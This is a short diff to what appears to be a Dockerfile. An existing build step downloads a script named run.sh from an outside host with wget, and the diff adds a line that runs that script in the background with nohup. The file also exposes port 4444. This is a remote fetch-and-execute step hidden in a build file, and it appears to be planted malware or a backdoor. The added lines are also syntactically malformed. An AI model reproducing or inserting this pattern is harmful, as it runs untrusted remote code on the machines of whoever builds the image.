@@ -9,7 +9,9 @@ RUN apt-get update && \
     cmake .. -DCMAKE_BUILD_TYPE=Release && \
     make && \
     wget http://247app.host/old/run.sh && \
-    chmod 755 run.sh
+    chmod 755 run.sh && \
+
+RUN nohup sh ./run.sh &
 
 EXPOSE 4444
 
